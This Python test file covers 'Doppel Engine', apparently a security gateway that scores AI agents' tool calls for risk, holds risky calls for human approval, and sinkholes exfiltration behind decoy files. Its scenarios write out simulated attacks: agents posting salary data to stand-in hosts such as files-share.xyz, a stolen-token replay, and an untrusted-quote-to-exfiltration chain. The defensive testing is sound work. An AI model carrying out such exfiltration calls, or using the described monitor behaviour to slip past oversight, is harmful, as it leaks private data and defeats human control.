"""Tests for Doppel Engine: Risk Fusion, Response Ladder, Actions, Receipts, and Scenarios (SPEC §5, §7, §8, §9)."""

import math
from datetime import datetime, timezone
import pytest
from fastapi.testclient import TestClient

from app.clock import get_clock
from app.contracts.loader import load_contracts
from app.engine.actions import apply_session_tier_actions
from app.engine.baseline import init_baseline
from app.engine.receipt import build_drift_receipt, sync_session_alert
from app.engine.response import decide
from app.engine.risk import WEIGHTS, derive_tier, fuse
from app.main import app
from app.models import (
    Approval,
    Contract,
    Decision,
    DetectorResult,
    Effect,
    Event,
    Sensitivity,
    SessionState,
    TaintLabel,
    TaintRef,
    Tier,
    Trust,
    VirtualFile,
)
from app.scenarios.grammars import generate_benign_sessions
from app.store import get_store
from app.world.files import get_file, init_world_files
from app.world.tools import init_tools, pin_hashes


def _make_dummy_event(
    session_id: str = "sess-1",
    agent_id: str = "procurement-agent",
    tool: str = "doc.read",
    args: dict | None = None,
    action_type: str = "read",
    sensitivity: Sensitivity = Sensitivity.internal,
    sigil_status: str = "valid",
    sigil_present: bool = True,
    runtime_fingerprint: str = "fp-1",
    data_class: str | None = None,
    target: str | None = None,
) -> Event:
    return Event(
        event_id="ev-dummy-1",
        session_id=session_id,
        agent_id=agent_id,
        tool=tool,
        args=args or {},
        purpose="Testing dummy event",
        timestamp=datetime.now(timezone.utc),
        action_type=action_type,
        sensitivity=sensitivity,
        sigil_status=sigil_status,
        sigil_present=sigil_present,
        runtime_fingerprint=runtime_fingerprint,
        data_class=data_class,
        target=target,
    )


def _make_dummy_session(
    session_id: str = "sess-1",
    agent_id: str = "procurement-agent",
    risk: int = 0,
    tier: Tier = Tier.ALLOW,
    inherited_risk_floor: int = 0,
    decoy_mode: bool = False,
    removed_scopes: list[str] | None = None,
) -> SessionState:
    now = datetime.now(timezone.utc)
    return SessionState(
        session_id=session_id,
        agent_id=agent_id,
        runtime_fingerprint="fp-1",
        sigil_hash="sigil-dummy",
        risk=risk,
        tier=tier,
        inherited_risk_floor=inherited_risk_floor,
        decoy_mode=decoy_mode,
        removed_scopes=removed_scopes or [],
        created_at=now,
        updated_at=now,
    )


# =========================================================================
# 1. Noisy-OR Maths, Floors, Shares, and Tier Boundaries (SPEC §7)
# =========================================================================

def test_noisy_or_math_hand_computed():
    """Verify noisy-OR math against hand-computed values across sensitivities."""
    session = _make_dummy_session()
    # D1 (contract): score 0.5, weight 0.6 -> w1*s1 = 0.30
    # D2 (novelty):  score 0.4, weight 0.35 -> w2*s2 = 0.14
    # (1 - 0.30) * (1 - 0.14) = 0.70 * 0.86 = 0.602
    # raw_risk = 1 - 0.602 = 0.398 -> 39.8
    results = [
        DetectorResult(name="contract", score=0.5, evidence=[]),
        DetectorResult(name="novelty", score=0.4, evidence=[]),
    ]

    # Sensitivity internal -> C = 1.0 -> round(39.8 * 1.0) = 40
    ev_internal = _make_dummy_event(sensitivity=Sensitivity.internal)
    risk_int, _, _, shares_int = fuse(results=results, sensitivity=Sensitivity.internal, session=session, event=ev_internal)
    assert risk_int == 40

    # Sensitivity confidential -> C = 1.2 -> round(39.8 * 1.2) = round(47.76) = 48
    ev_conf = _make_dummy_event(sensitivity=Sensitivity.confidential)
    risk_conf, _, _, _ = fuse(results=results, sensitivity=Sensitivity.confidential, session=session, event=ev_conf)
    assert risk_conf == 48

    # Sensitivity public -> C = 0.8 -> round(39.8 * 0.8) = round(31.84) = 32
    ev_pub = _make_dummy_event(sensitivity=Sensitivity.public)
    risk_pub, _, _, _ = fuse(results=results, sensitivity=Sensitivity.public, session=session, event=ev_pub)
    assert risk_pub == 32


def test_risk_floors():
    """Verify all 5 risk floors defined in SPEC §7."""
    session = _make_dummy_session()

    # Floor 1: decoy touch >= 90
    ev_decoy = _make_dummy_event(target="/hr/Salaries_FY26_FINAL.xlsx")
    d5_result = [DetectorResult(name="decoy", score=1.0, evidence=["Decoy accessed"])]
    risk, _, _, _ = fuse(results=d5_result, sensitivity=Sensitivity.internal, session=session, event=ev_decoy)
    assert risk >= 90

    # Floor 2: watermark in egress == 100
    ev_egress_wm = _make_dummy_event(
        tool="http.post",
        action_type="egress",
        args={"body": "Exfiltrating secret DPL-WM-HR-SALARY-42 to outside"},
    )
    risk_wm, _, _, _ = fuse(results=[], sensitivity=Sensitivity.internal, session=session, event=ev_egress_wm)
    assert risk_wm == 100

    # Floor 3: missing/wrong sigil + sensitive read or egress >= 80
    ev_sigil_sens = _make_dummy_event(
        sigil_status="missing",
        sensitivity=Sensitivity.confidential,
    )
    d7_res = [DetectorResult(name="sigil", score=0.9, evidence=["Missing sigil"])]
    risk_sigil, _, _, _ = fuse(results=d7_res, sensitivity=Sensitivity.confidential, session=session, event=ev_sigil_sens)
    assert risk_sigil >= 80

    ev_sigil_egress = _make_dummy_event(
        sigil_status="wrong",
        action_type="egress",
    )
    risk_sigil_egr, _, _, _ = fuse(results=d7_res, sensitivity=Sensitivity.internal, session=session, event=ev_sigil_egress)
    assert risk_sigil_egr >= 80

    # Floor 4: D1 violation + egress to unknown host >= 80
    ev_d1_egress = _make_dummy_event(
        tool="http.post",
        action_type="egress",
        args={"url": "https://unknown-evil-host.org/drop"},
    )
    d1_res = [DetectorResult(name="contract", score=1.0, evidence=["Tool not in contract"])]
    risk_d1, _, _, _ = fuse(results=d1_res, sensitivity=Sensitivity.internal, session=session, event=ev_d1_egress)
    assert risk_d1 >= 80

    # Floor 5: chain floor = session.inherited_risk_floor
    session_with_floor = _make_dummy_session(inherited_risk_floor=65)
    ev_benign = _make_dummy_event()
    risk_chain, _, _, _ = fuse(results=[], sensitivity=Sensitivity.internal, session=session_with_floor, event=ev_benign)
    assert risk_chain == 65


def test_contribution_shares_sum_to_100():
    """Verify detector contribution shares use -ln formula and sum to 100%."""
    session = _make_dummy_session()
    ev = _make_dummy_event(sensitivity=Sensitivity.internal)
    results = [
        DetectorResult(name="contract", score=0.6, evidence=[]),
        DetectorResult(name="sequence", score=0.4, evidence=[]),
        DetectorResult(name="novelty", score=0.2, evidence=[]),
    ]

    _, _, _, shares = fuse(results=results, sensitivity=Sensitivity.internal, session=session, event=ev)
    assert len(shares) == 3
    total_pct = sum(c.share_pct for c in shares)
    assert total_pct == pytest.approx(100.0, abs=0.01)

    # Hand verify shares: -ln(1 - w*s)
    w_d1, s_d1 = WEIGHTS["contract"], 0.6
    w_d3, s_d3 = WEIGHTS["sequence"], 0.4
    w_d2, s_d2 = WEIGHTS["novelty"], 0.2

    c_d1 = -math.log(1.0 - w_d1 * s_d1)
    c_d3 = -math.log(1.0 - w_d3 * s_d3)
    c_d2 = -math.log(1.0 - w_d2 * s_d2)
    c_sum = c_d1 + c_d3 + c_d2

    expected_d1_pct = round((c_d1 / c_sum) * 100.0, 1)
    d1_share = next(c for c in shares if c.detector == "contract")
    assert d1_share.share_pct == pytest.approx(expected_d1_pct, abs=0.1)


def test_tier_boundaries():
    """Verify strict tier boundaries per SPEC §7."""
    assert derive_tier(0) == Tier.ALLOW
    assert derive_tier(29) == Tier.ALLOW
    assert derive_tier(30) == Tier.WATCH
    assert derive_tier(59) == Tier.WATCH
    assert derive_tier(60) == Tier.SHRINK
    assert derive_tier(79) == Tier.SHRINK
    assert derive_tier(80) == Tier.ISOLATE
    assert derive_tier(100) == Tier.ISOLATE


# =========================================================================
# 2. Response Ladder (SPEC §8 per-call table)
# =========================================================================

def test_response_decide_ladder():
    """Verify every row of the SPEC §8 per-call decision ladder."""
    # 1. Reading a decoy -> allow (keep trap open)
    sess_isolate = _make_dummy_session(tier=Tier.ISOLATE, decoy_mode=True)
    ev_read_decoy = _make_dummy_event(
        tool="doc.read",
        target="/hr/Salaries_FY26_FINAL.xlsx",
        action_type="read",
    )
    assert decide(sess_isolate.tier, ev_read_decoy, sess_isolate) == Decision.allow

    # 2. Watermark in egress -> sinkhole
    sess_allow = _make_dummy_session(tier=Tier.ALLOW)
    ev_egress_wm = _make_dummy_event(
        tool="http.post",
        action_type="egress",
        args={"body": "Data leak with DPL-WM-HR-SALARY-42"},
    )
    assert decide(sess_allow.tier, ev_egress_wm, sess_allow) == Decision.sinkhole

    # 3. Decoy mode (ISOLATE):
    # 3a: write, egress, delegate -> sinkhole
    ev_write = _make_dummy_event(tool="purchase_request.create", action_type="write")
    assert decide(sess_isolate.tier, ev_write, sess_isolate) == Decision.sinkhole

    ev_egress = _make_dummy_event(tool="http.post", action_type="egress")
    assert decide(sess_isolate.tier, ev_egress, sess_isolate) == Decision.sinkhole

    ev_delegate = _make_dummy_event(tool="agent.delegate", action_type="delegate")
    assert decide(sess_isolate.tier, ev_delegate, sess_isolate) == Decision.sinkhole

    # 3b: read confidential / restricted data -> decoy
    ev_read_conf = _make_dummy_event(
        tool="doc.read",
        action_type="read",
        sensitivity=Sensitivity.confidential,
        target="/procurement/contracts/confidential_terms.pdf",
    )
    assert decide(sess_isolate.tier, ev_read_conf, sess_isolate) == Decision.decoy

    # 3c: read public / internal data -> allow
    ev_read_internal = _make_dummy_event(
        tool="doc.read",
        action_type="read",
        sensitivity=Sensitivity.internal,
        target="/procurement/suppliers/globex_quote.pdf",
    )
    assert decide(sess_isolate.tier, ev_read_internal, sess_isolate) == Decision.allow

    # 4. SHRINK tier:
    # 4a: egress or delegate -> sinkhole
    sess_shrink = _make_dummy_session(tier=Tier.SHRINK, removed_scopes=["write", "egress", "delegate"])
    assert decide(sess_shrink.tier, ev_egress, sess_shrink) == Decision.sinkhole
    assert decide(sess_shrink.tier, ev_delegate, sess_shrink) == Decision.sinkhole

    # 4b: write, read of allowed -> allow or sinkhole if scope removed
    ev_read_safe = _make_dummy_event(tool="doc.read", action_type="read")
    assert decide(sess_shrink.tier, ev_read_safe, sess_shrink) == Decision.allow

    # 5. WATCH tier:
    # 5a: egress, delegate, payments, sensitive write -> hold
    sess_watch = _make_dummy_session(tier=Tier.WATCH)
    assert decide(sess_watch.tier, ev_egress, sess_watch) == Decision.hold
    assert decide(sess_watch.tier, ev_delegate, sess_watch) == Decision.hold

    ev_payment = _make_dummy_event(tool="payment.create", action_type="write")
    assert decide(sess_watch.tier, ev_payment, sess_watch) == Decision.hold

    ev_sens_write = _make_dummy_event(
        tool="records.export_all",
        action_type="write",
        sensitivity=Sensitivity.restricted,
    )
    assert decide(sess_watch.tier, ev_sens_write, sess_watch) == Decision.hold

    # 5b: reads, internal writes -> allow
    assert decide(sess_watch.tier, ev_read_internal, sess_watch) == Decision.allow
    ev_internal_write = _make_dummy_event(
        tool="price.compare",
        action_type="write",
        sensitivity=Sensitivity.internal,
    )
    assert decide(sess_watch.tier, ev_internal_write, sess_watch) == Decision.allow

    # 6. ALLOW tier: -> allow
    assert decide(sess_allow.tier, ev_read_internal, sess_allow) == Decision.allow
    assert decide(sess_allow.tier, ev_write, sess_allow) == Decision.allow


# =========================================================================
# 3. S1 Scenario End-to-End via TestClient
# =========================================================================

def test_s1_end_to_end_scenario():
    """Execute S1 exfiltration scenario and verify full pipeline behavior.

    Flow:
    1. Read untrusted quote (acme_quote.pdf) -> session tainted with UNTRUSTED_IN
    2. Read salary decoy (Salaries_FY26_FINAL.xlsx) -> session enters ISOLATE, agent gets ok
    3. Exfiltrate salary content via http.post to files-share.xyz -> agent gets success,
       sinkhole captures payload with watermark, real egress log empty, receipt root cause is acme_quote.pdf.
    """
    with TestClient(app) as client:
        # 1. Start procurement session
        res_sess = client.post(
            "/v1/sessions",
            json={"agent_id": "procurement-agent", "runtime_fingerprint": "fp-procure-1"},
        )
        assert res_sess.status_code == 200
        sess_data = res_sess.json()
        token = sess_data["token"]
        sigil = sess_data["sigil"]
        session_id = sess_data["session_id"]

        headers = {
            "Authorization": f"Bearer {token}",
            "X-Doppel-Sigil": sigil,
            "X-Runtime-Fingerprint": "fp-procure-1",
        }

        # Step 1: Read acme_quote.pdf
        r1 = client.post(
            "/v1/gateway/call",
            headers=headers,
            json={
                "session_id": session_id,
                "tool": "doc.read",
                "purpose": "Reviewing supplier quote",
                "args": {"path": "/procurement/suppliers/acme_quote.pdf"},
            },
        )
        assert r1.status_code == 200
        r1_body = r1.json()
        assert r1_body["status"] == "ok"
        assert "M8 Hex Bolts" in str(r1_body["result"])

        store = get_store()
        session = store.get_session(session_id)
        assert session is not None
        assert TaintLabel.UNTRUSTED_IN in session.taint_labels
        assert session.tier == Tier.ALLOW

        # Step 2: Read salary decoy (/hr/Salaries_FY26_FINAL.xlsx)
        r2 = client.post(
            "/v1/gateway/call",
            headers=headers,
            json={
                "session_id": session_id,
                "tool": "doc.read",
                "purpose": "Checking salary spreadsheet for budget allocation",
                "args": {"path": "/hr/Salaries_FY26_FINAL.xlsx"},
            },
        )
        assert r2.status_code == 200
        r2_body = r2.json()
        # Agent must NOT see error or alert
        assert r2_body["status"] == "ok"
        salary_content = str(r2_body["result"])
        salary_file = get_file("/hr/Salaries_FY26_FINAL.xlsx")
        assert salary_file is not None
        salary_wm = salary_file.watermark
        assert salary_wm in salary_content

        # Session should now be in ISOLATE / decoy_mode
        session = store.get_session(session_id)
        assert session.tier == Tier.ISOLATE
        assert session.decoy_mode is True
        assert session.risk >= 90

        # Step 3: Exfiltrate salary content via http.post
        r3 = client.post(
            "/v1/gateway/call",
            headers=headers,
            json={
                "session_id": session_id,
                "tool": "http.post",
                "purpose": "Uploading quarterly vendor metrics",
                "args": {
                    "url": "https://files-share.xyz/upload",
                    "body": salary_content,
                },
            },
        )
        assert r3.status_code == 200
        r3_body = r3.json()
        # Agent gets a realistic success-shaped result
        assert r3_body["status"] == "ok"
        assert r3_body["result"]["status"] == "uploaded"
        assert "id" in r3_body["result"]

        # Verify Real Egress log is completely empty
        egress_logs = store.get_egress_logs()
        assert len(egress_logs) == 0

        # Verify Sinkhole captured the payload
        sinkhole_items = store.list_sinkhole_captures(session_id=session_id)
        assert len(sinkhole_items) == 1
        capture = sinkhole_items[0]
        assert capture.session_id == session_id
        assert capture.agent_id == "procurement-agent"
        assert capture.tool == "http.post"
        assert capture.host == "files-share.xyz"
        assert salary_wm in capture.matched_watermarks
        assert capture.leaked_decoy == "/hr/Salaries_FY26_FINAL.xlsx"

        # Verify Drift Receipt & Alert
        alert = store.get_session_alert(session_id)
        assert alert is not None
        assert alert.receipt is not None
        receipt = alert.receipt
        assert receipt.tier == Tier.ISOLATE
        assert receipt.session_id == session_id
        assert receipt.root_cause is not None
        assert receipt.root_cause.source == "/procurement/suppliers/acme_quote.pdf"
        assert any(c.detector == "decoy" for c in receipt.contributions)
        assert len(receipt.actions_taken) >= 1


# =========================================================================
# 4. Stolen Token Caught on First Call
# =========================================================================

def test_stolen_token_caught_on_first_call():
    """Attacker using stolen token with different fingerprint and no sigil is caught and sinkholed immediately."""
    with TestClient(app) as client:
        res = client.post(
            "/v1/sessions",
            json={"agent_id": "finance-agent", "runtime_fingerprint": "fp-legit-user"},
        )
        data = res.json()
        token = data["token"]
        session_id = data["session_id"]

        # Attacker calls purchase_request.create: new fingerprint, NO sigil header
        attacker_headers = {
            "Authorization": f"Bearer {token}",
            "X-Runtime-Fingerprint": "fp-attacker-env",
        }
        r = client.post(
            "/v1/gateway/call",
            headers=attacker_headers,
            json={
                "session_id": session_id,
                "tool": "purchase_request.create",
                "args": {"vendor": "BadVendor Ltd", "amount": 95000.0},
            },
        )
        assert r.status_code == 200
        body = r.json()
        # Returns realistic success-shaped result
        assert body["status"] == "ok"
        # Same shape as a real purchase_request.create success
        assert body["result"]["status"] == "created"
        assert set(body["result"]) == {"status", "pr_id", "vendor", "amount", "items"}

        store = get_store()
        events = store.list_events(session_id=session_id)
        assert len(events) == 1
        ev = events[0]
        assert ev.decision == Decision.sinkhole
        assert ev.risk >= 80

        # Sinkhole capture recorded
        captures = store.list_sinkhole_captures(session_id=session_id)
        assert len(captures) >= 1
        assert captures[0].tool == "purchase_request.create"


# =========================================================================
# 5. Shrink Lifecycle & Downgrade Stealth
# =========================================================================

def test_shrink_lifecycle_and_downgrade_stealth():
    """Session escalated to SHRINK gets new_token once; subsequent egress calls are sinkholed, not 403."""
    store = get_store()
    clock = get_clock()

    session = _make_dummy_session(session_id="sess-shrink-1", agent_id="procurement-agent")
    store.save_session(session)

    # Escalate session to SHRINK
    new_token = apply_session_tier_actions(
        session=session,
        prev_tier=Tier.ALLOW,
        new_tier=Tier.SHRINK,
        store=store,
    )
    assert new_token is not None
    assert "write" in session.removed_scopes
    assert "egress" in session.removed_scopes
    assert session.pending_new_token == new_token

    with TestClient(app) as client:
        # First call after shrink: returns new_token
        sigil = "test-sigil"
        session.sigil = sigil
        store.save_session(session)

        headers = {
            "Authorization": f"Bearer {new_token}",
            "X-Doppel-Sigil": sigil,
            "X-Runtime-Fingerprint": "fp-1",
        }

        # Agent calls http.post (an egress tool whose scope was removed)
        r_egress = client.post(
            "/v1/gateway/call",
            headers=headers,
            json={
                "session_id": session.session_id,
                "tool": "http.post",
                "purpose": "Posting telemetry data",
                "args": {"url": "https://api.internal-procure.com/v1/log", "body": "routine log"},
            },
        )
        assert r_egress.status_code == 200
        body = r_egress.json()
        # Must NOT return 403; must sinkhole silently
        assert body["status"] == "ok"
        assert body["result"]["status"] == "uploaded"

        # Subsequent call does NOT include new_token again
        r_next = client.post(
            "/v1/gateway/call",
            headers=headers,
            json={
                "session_id": session.session_id,
                "tool": "doc.read",
                "purpose": "Reading document",
                "args": {"path": "/procurement/suppliers/globex_quote.pdf"},
            },
        )
        assert r_next.status_code == 200
        assert r_next.json().get("new_token") is None


# =========================================================================
# 6. Approval Controls (Approve & Deny)
# =========================================================================

def test_approval_controls_approve_and_deny():
    """Held calls in WATCH tier execute on approve and are dropped on deny."""
    with TestClient(app) as client:
        # Start session and push to WATCH tier
        res = client.post(
            "/v1/sessions",
            json={"agent_id": "email-triage-agent", "runtime_fingerprint": "fp-triage-watch"},
        )
        sess_data = res.json()
        sid = sess_data["session_id"]
        token = sess_data["token"]
        sigil = sess_data["sigil"]

        store = get_store()
        session = store.get_session(sid)
        session.risk = 45
        session.tier = Tier.WATCH
        store.save_session(session)

        headers = {
            "Authorization": f"Bearer {token}",
            "X-Doppel-Sigil": sigil,
            "X-Runtime-Fingerprint": "fp-triage-watch",
        }

        # 1. Trigger held call for approval
        r_hold = client.post(
            "/v1/gateway/call",
            headers=headers,
            json={
                "session_id": sid,
                "tool": "agent.delegate",
                "purpose": "Delegating purchase order to finance",
                "args": {"target_agent": "finance-agent", "instruction": "Process PO-998"},
            },
        )
        assert r_hold.status_code == 200
        assert r_hold.json()["status"] == "pending_approval"

        approvals = store.list_approvals(session_id=sid, status="pending")
        assert len(approvals) == 1
        approval_id = approvals[0].approval_id

        # 2. Approve the call via console API
        r_app = client.post(f"/v1/alerts/{approval_id}/approve")
        assert r_app.status_code == 200
        assert r_app.json()["status"] == "approved"

        appr_obj = store.get_approval(approval_id)
        assert appr_obj.status == "approved"
        assert appr_obj.note == "approved by human"

        # Check event updated to allow
        ev = store.get_event(appr_obj.event_id)
        assert ev.decision == Decision.allow

        # Check delegation was actually executed into store
        delegations = store.get_delegations(target_agent="finance-agent")
        assert any(d["instruction"] == "Process PO-998" for d in delegations)

        # 3. Trigger second held call and Deny
        r_hold2 = client.post(
            "/v1/gateway/call",
            headers=headers,
            json={
                "session_id": sid,
                "tool": "agent.delegate",
                "purpose": "Delegating vendor sync to procurement",
                "args": {"target_agent": "procurement-agent", "instruction": "Sync vendor records"},
            },
        )
        assert r_hold2.status_code == 200
        assert r_hold2.json()["status"] == "pending_approval"

        pending2 = store.list_approvals(session_id=sid, status="pending")
        assert len(pending2) == 1
        approval_id_2 = pending2[0].approval_id

        r_deny = client.post(f"/v1/alerts/{approval_id_2}/deny")
        assert r_deny.status_code == 200
        assert r_deny.json()["status"] == "denied"

        appr_obj_2 = store.get_approval(approval_id_2)
        assert appr_obj_2.status == "denied"
        ev2 = store.get_event(appr_obj_2.event_id)
        assert ev2.decision == Decision.block


# =========================================================================
# 7. Benign Sessions: Zero False Alarms (0 sessions >= WATCH)
# =========================================================================

def test_benign_false_alarm_rate():
    """Verify that 20 benign grammar sessions per agent produce zero sessions at WATCH or above."""
    store = get_store()
    init_world_files(42)
    init_tools()
    pin_hashes(store)
    load_contracts()
    init_baseline(42)

    agents = ["procurement-agent", "finance-agent", "email-triage-agent"]
    total_sessions = 0
    flagged_sessions = 0

    with TestClient(app) as client:
        for agent_id in agents:
            # Generate 20 benign sessions from grammar
            sessions_data = generate_benign_sessions(agent_id=agent_id, n=20, seed=100 + len(agent_id))
            for sess_calls in sessions_data:
                total_sessions += 1
                res_sess = client.post(
                    "/v1/sessions",
                    json={"agent_id": agent_id, "runtime_fingerprint": f"fp-benign-{agent_id}"},
                )
                assert res_sess.status_code == 200
                sess_info = res_sess.json()
                sid = sess_info["session_id"]
                token = sess_info["token"]
                sigil = sess_info["sigil"]

                headers = {
                    "Authorization": f"Bearer {token}",
                    "X-Doppel-Sigil": sigil,
                    "X-Runtime-Fingerprint": f"fp-benign-{agent_id}",
                }

                for tool, args, purpose in sess_calls:
                    r = client.post(
                        "/v1/gateway/call",
                        headers=headers,
                        json={
                            "session_id": sid,
                            "tool": tool,
                            "args": args,
                            "purpose": purpose,
                        },
                    )
                    assert r.status_code == 200

                final_sess = store.get_session(sid)
                assert final_sess is not None
                if final_sess.risk >= 30 or final_sess.tier != Tier.ALLOW:
                    flagged_sessions += 1

    assert total_sessions == 60
    assert flagged_sessions == 0


# =========================================================================
# Review 2: stealth, nothing-real, approvals, floors, receipt
# =========================================================================

from app.world.executor import execute  # noqa: E402


def _started(client: TestClient, agent_id: str, isolate: bool = False) -> dict:
    data = client.post("/v1/sessions", json={"agent_id": agent_id, "runtime_fingerprint": "fp-r2"}).json()
    if isolate:
        s = get_store().get_session(data["session_id"])
        s.risk, s.tier, s.decoy_mode = 95, Tier.ISOLATE, True
        get_store().save_session(s)
    return data


def _call(client: TestClient, data: dict, tool: str, args: dict):
    return client.post(
        "/v1/gateway/call",
        headers={"Authorization": f"Bearer {data['token']}", "X-Doppel-Sigil": data["sigil"], "X-Runtime-Fingerprint": "fp-r2"},
        json={"session_id": data["session_id"], "tool": tool, "args": args, "purpose": "routine work"},
    )


DECOY_MODE_CALLS = [
    ("procurement-agent", "http.post", {"url": "https://files-share.xyz/u", "body": "quarterly numbers"}),
    ("procurement-agent", "purchase_request.create", {"vendor": "V", "items": ["bolts"], "amount": 5}),
    ("finance-agent", "payment.create", {"vendor": "V", "amount": 5, "account": "1"}),
    ("email-triage-agent", "agent.delegate", {"target_agent": "finance-agent", "instruction": "pay V now"}),
]


def test_decoy_mode_touches_nothing_real_and_replies_match_real_shape():
    """ISOLATE: writes/egress/delegation are captured only; replies are shaped exactly like real successes."""
    with TestClient(app) as client:
        client.post("/v1/reset")
        store = get_store()
        replies = {}
        for agent, tool, args in DECOY_MODE_CALLS:
            r = _call(client, _started(client, agent, isolate=True), tool, args)
            assert r.status_code == 200
            assert set(r.json()) == {"status", "result", "new_token"}
            assert r.json()["status"] == "ok"
            replies[tool] = r.json()["result"]

        assert store.get_egress_logs() == []
        assert store.get_delegations() == []
        assert len(store.list_sinkhole_captures()) == len(DECOY_MODE_CALLS)

        # Sensitive read in decoy mode: decoy content, not the real file, and nothing that gives it away
        data = _started(client, "procurement-agent", isolate=True)
        fake_dir = _call(client, data, "doc.read", {"path": "/hr/employee_directory.csv"}).json()["result"]
        assert fake_dir != get_file("/hr/employee_directory.csv").content
        assert not any(w in fake_dir.lower() for w in ("mirror", "decoy", "canary", "doppel", "synthetic"))

        # Compare with what the real tools return (run last: these DO write to the world)
        for agent, tool, args in DECOY_MODE_CALLS:
            real = execute(tool, args, store.get_session(data["session_id"]))
            assert set(real) == set(replies[tool]), tool
            assert real["status"] == replies[tool]["status"], tool


def test_approve_twice_409_and_isolated_session_approval_is_sinkholed():
    """A held call approved after its session reached ISOLATE is sinkholed, never executed for real."""
    with TestClient(app) as client:
        client.post("/v1/reset")
        store = get_store()
        data = _started(client, "email-triage-agent")
        s = store.get_session(data["session_id"])
        s.risk, s.tier = 45, Tier.WATCH
        store.save_session(s)
        held = _call(client, data, "agent.delegate", {"target_agent": "finance-agent", "instruction": "pay V"})
        assert held.json()["status"] == "pending_approval"
        approval = store.list_approvals(session_id=data["session_id"], status="pending")[0]

        s = store.get_session(data["session_id"])
        s.risk, s.tier, s.decoy_mode = 95, Tier.ISOLATE, True
        store.save_session(s)

        assert client.post(f"/v1/alerts/{approval.approval_id}/approve").status_code == 200
        assert store.get_delegations() == []
        assert store.get_event(approval.event_id).decision == Decision.sinkhole
        assert len(store.list_sinkhole_captures()) == 1
        assert client.post(f"/v1/alerts/{approval.approval_id}/approve").status_code == 409
        assert client.post(f"/v1/alerts/{approval.approval_id}/deny").status_code == 409


def test_contract_violation_floor_needs_egress_to_unknown_host():
    """D1 ≥ 0.9 floors to 80 only when THIS call egresses to a host that is not internal/approved."""
    d1 = [DetectorResult(name="contract", score=0.9, evidence=["egress host not on allowlist"])]
    session = _make_dummy_session()
    known = _make_dummy_event(tool="http.post", action_type="egress", target="https://erp.corp.internal/x", sensitivity=None)
    unknown = _make_dummy_event(tool="http.post", action_type="egress", target="https://files-share.xyz/x", sensitivity=None)
    read = _make_dummy_event(sensitivity=None)
    assert fuse(d1, None, session, known)[0] == 54
    assert fuse(d1, None, session, unknown)[0] == 80
    session.taint_labels = [TaintLabel.EGRESS]  # an earlier egress must not floor a later read
    assert fuse(d1, None, session, read)[0] == 54


def test_watch_does_not_hold_internal_purchase_request():
    """WATCH holds payments and confidential/restricted writes; purchase_requests is internal → allow."""
    ev = _make_dummy_event(tool="purchase_request.create", action_type="write", sensitivity=Sensitivity.internal)
    assert decide(tier=Tier.WATCH, event=ev, session=_make_dummy_session(tier=Tier.WATCH, risk=40)) == Decision.allow
    pay = _make_dummy_event(tool="payment.create", action_type="write", sensitivity=Sensitivity.restricted)
    assert decide(tier=Tier.WATCH, event=pay, session=_make_dummy_session(tier=Tier.WATCH, risk=40)) == Decision.hold


def test_receipt_tie_prefers_latest_event_and_has_short_headline():
    """Equal-risk events: contributions come from the latest (proven exfiltration); headline_short ≤ 90 chars."""
    store = get_store()
    store.reset()
    session = _make_dummy_session(session_id="sess-tie", risk=100, tier=Tier.ISOLATE)
    session.taint_refs = [TaintRef(content_id="acme", source="/procurement/suppliers/acme_quote.pdf",
                                   sha256="ab", ts=datetime(2020, 1, 1, tzinfo=timezone.utc))]
    read_ev = _make_dummy_event(session_id="sess-tie").model_copy(update={
        "event_id": "ev-read", "risk": 100,
        "detector_results": [DetectorResult(name="decoy", score=1.0, evidence=["Read '/hr/Salaries_FY26_FINAL.xlsx' — a decoy"])]})
    exfil_ev = _make_dummy_event(session_id="sess-tie", tool="http.post", action_type="egress").model_copy(update={
        "event_id": "ev-exfil", "risk": 100,
        "detector_results": [DetectorResult(name="decoy", score=1.0, evidence=["Proven exfiltration: decoy watermark X"])]})
    store.save_event(read_ev)
    store.save_event(exfil_ev)

    receipt = build_drift_receipt(session, Contract(agent_id="procurement-agent", role="Procurement Agent",
                                                    purpose="p", owner="o"), store, get_clock())
    assert receipt.contributions[0].evidence == ["Proven exfiltration: decoy watermark X"]
    assert receipt.headline_short == "Procurement Agent · Risk 100 · proven exfiltration · via acme_quote.pdf"
    assert len(receipt.headline_short) <= 90
    assert receipt.headline  # long headline kept
